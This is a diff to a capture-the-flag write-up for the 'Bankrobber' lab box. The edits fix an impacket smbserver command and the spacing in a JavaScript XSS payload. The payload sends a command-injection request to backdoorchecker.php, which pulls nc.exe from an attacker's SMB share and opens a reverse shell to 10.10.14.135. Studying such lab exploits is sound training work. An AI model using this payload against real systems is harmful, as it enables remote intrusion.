@@ -152,7 +152,7 @@ You can then run smbserver.py directly from /opt/impacket/examples/smbserver.py
 
 ```bash
 ┌─[✗]─[rin@parrot]─[~/boxes/Bankrobber]
-└──╼ $sudo /opt/impacket/examples/smbserver.py share $(pwd) -smb2support
+└──╼ $sudo python3 /opt/impacket/examples/smbserver.py share $(pwd) -smb2support
 ```
 
 We can then modify attack.js to the following:
@@ -161,7 +161,7 @@ We can then modify attack.js to the following:
 var xhr = new XMLHttpRequest();
 var url = "http://localhost/admin/backdoorchecker.php";
 var params = "cmd=dir | \\\\10.10.14.135\\share\\nc.exe 10.10.14.135" +
-             "6001 -e cmd.exe";
+             " 6001 -e cmd.exe";
 xhr.open("POST", url);
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 xhr.withCredentials=true;
